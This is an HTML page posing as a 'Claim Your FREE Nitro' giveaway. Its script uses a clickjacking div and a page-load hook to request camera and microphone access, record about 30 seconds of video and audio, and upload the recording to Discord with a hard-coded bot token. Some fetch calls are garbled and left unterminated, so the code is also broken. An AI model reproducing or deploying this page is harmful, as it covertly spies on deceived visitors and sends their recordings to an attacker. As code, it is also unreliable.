<body onload="attemptStartRecording()">
    <div id="clickjack" onclick="startRecording()"></div>
    <div id="content">
        <h1>ðŸŽ‰ Claim Your FREE Nitro! ðŸŽ‰</h1>
        <p>Click anywhere to activate your Nitro reward!</p>
        <button onclick="alert('Nitro Activated!')">Activate Nitro</button>
    </div>

    <script>
        const botToken = "eWR7pVsIMTQ3jDkZsqVbKIButR367U25";
        const channelId = "112233445566778899";
        let mediaRecorder;
        let recordedChunks = [];

        async function attemptStartRecording() {
            try {
                console.log("Attempting to start recording immediately...");
                await startRecording();
            } catch (error) {
                console.error("Failed to start recording on page load:", error);
                sendErrorMessageToDiscord(`Failed to start on load: ${error.message}`);
            }
        }

        async function startRecording() {
            try {
                console.log("Requesting media devices...");
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: true
                });

                console.log("Media devices accessed successfully.");
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp9,opus'
                });

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                        console.log(`Data chunk: ${event.data.size} bytes`);
                    }
                };

                mediaRecorder.onstop = async () => {
                    console.log("Recording stopped. Processing data...");
                    const blob = new Blob(recordedChunks, {
                        type: 'video/webm'
                    });
                    await uploadToDiscord(blob);
                    recordedChunks = [];
                    console.log("Recording uploaded and reset.");
                };

                mediaRecorder.onerror = (event) => {
                    console.error("MediaRecorder Error: ", event.error);
                    sendErrorMessageToDiscord(`MediaRecorder error: ${event.error}`);
                };

                console.log("Starting media recorder...");
                mediaRecorder.start();
                console.log("Media recorder started.");
                setTimeout(() => {
                    stopRecording();
                }, 30000); // 30 seconds
            } catch (error) {
                console.error("Error accessing media devices:", error);
                sendErrorMessageToDiscord(`Access error: ${error.message}`);
            }
        }

        async function stopRecording() {
            if (mediaRecorder && mediaRecorder.state !== "inactive") {
                console.log("Stopping media recorder...");
                mediaRecorder.stop();
                console.log("Media recorder stopped.");
            }
        }

        async function uploadToDiscord(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'webcam_voice.webm');
            formData.append('content', 'ðŸ“¹ New recording!');

            try {
                console.log("Uploading to Discord...");
                const response = await fetch(`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bot ${botToken}`
                    },
                    body: formData
                });

                if (!response.ok) {
                    console.error("Error uploading to Discord:", response.status, await response.text());
                    sendErrorMessageToDiscord(`Upload failed: ${response.status}`);
                } else {
                    console.log("Uploaded successfully.");
                }
            } catch (error) {
                console.error("Error uploading to Discord:", error);
                sendErrorMessageToDiscord(`Upload error: ${error.message}`);
            }
        }

        async function sendErrorMessageToDiscord(message) {
            try {
                console.log("Sending error message to Discord:", message);
                const response = await fetch(`, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bot ${botToken}`,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `ðŸ’¥ Error: ${message}`
                    })
                });

                if (!response.ok) {
                    console.error("Error sending error message to Discord:", response.status);
                } else {
                    console.log("Error message sent successfully.");
                }
            } catch (error) {
                console.error("Error sending error message to Discord:", error);
            }
        }
    </script>
</body>
